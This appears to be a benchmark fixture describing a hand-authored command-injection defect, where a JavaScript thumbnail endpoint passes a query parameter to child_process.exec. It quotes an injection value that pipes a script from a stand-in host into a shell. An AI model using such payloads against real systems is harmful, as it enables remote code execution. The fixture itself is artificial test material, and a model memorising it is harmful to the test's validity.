# Fixture: command-injection-exec-js

**Category:** security · **Language:** JavaScript

The thumbnail endpoint shells out to ImageMagick with `child_process.exec` and a command string
that embeds the user-supplied `req.query.name`. A name like `a.png; curl evil.sh | sh` runs arbitrary
commands as the web server user. `execFile` with an argument array avoids the shell.

**Provenance:** hand-authored planted defect (ADR-0018 §1). Diff size: 10 lines.
